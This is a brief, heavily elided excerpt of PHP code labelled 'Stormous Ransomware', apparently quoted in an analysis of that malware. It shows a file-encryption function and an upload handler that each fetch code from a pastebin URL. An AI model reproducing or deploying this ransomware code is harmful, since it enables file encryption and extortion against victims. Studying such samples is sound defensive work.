...
echo "<h2><center><font color='black'>Stormous Ransomware</font></center><br/></h2>";
...
function encfile($file){
  ...
  $code = file_get_contents('https://pastebin.com/kfdaxiR3');
...
if(isset($_POST['up'])){
    if($_POST['case'] == 'php')  {
      ...
      $d = file_get_contents('https://pastebin.com/kfdaxiR3');
